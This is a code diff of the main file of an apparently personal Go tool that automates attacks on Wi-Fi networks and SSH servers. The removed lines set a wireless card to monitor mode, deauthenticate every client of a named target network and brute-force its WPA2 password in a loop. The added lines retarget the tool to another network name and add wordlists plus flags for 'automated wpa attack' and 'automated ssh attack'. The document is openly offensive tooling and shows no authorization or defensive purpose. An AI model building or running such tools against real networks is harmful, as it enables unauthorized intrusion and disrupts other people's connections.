@@ -1,12 +1,16 @@
 package main
 
 import (
+	"flag"
 	"fmt"
 	"os"
 )
 
-const ESSID = "Allax Rei 2G"
+const ESSID = "Casa_wifi"
 const NET_INTERFACE = "wlan0"
+const WPA_WORDLIST = "wordlist.txt"
+
+const SSH_WORDLIST = "wordlist.txt"
 
 var ROOT_PASS string
 
@@ -15,31 +19,15 @@ func init() {
 }
 
 func main() {
-	checkAvailableInterfaces()
+	wpa := flag.Bool("wpa", false, "execute automated wpa attack")
+	ssh := flag.Bool("ssh", false, "execute automated ssh attack")
+	flag.Parse()
 
-	setInterfaceToMonitorMode(NET_INTERFACE)
-
-	macAddress, channel := getTargetInterfaceFromESSID(ESSID, NET_INTERFACE)
-
-	type T = struct{}
-	wait := make(chan T)
-
-	go func() {
-		analyzePackets(macAddress, channel, NET_INTERFACE)
-		<-wait
-	}()
-
-	go func() {
-		deauthEveryone(macAddress, channel, NET_INTERFACE)
-		<-wait
-	}()
-
-	runWPA2BruteForceInLoop()
-	wait <- struct{}{}
-
-	fmt.Println("killing analyze and deauth pids...")
-	execCmd("pkill -f 'airodump-ng'")
-	execCmd("pkill -f 'aireplay-ng'")
-
-	fmt.Println("if works go on and connect to the network!\nstop monitor mode => sudo airmon-ng stop wlan0\nsudo service NetworkManager restart")
+	if *wpa {
+		wpaAttack()
+	} else if *ssh {
+		sshAttack()
+	} else {
+		fmt.Println("theres no default attack, run this program with -ssh or -wpa flag")
+	}
 }
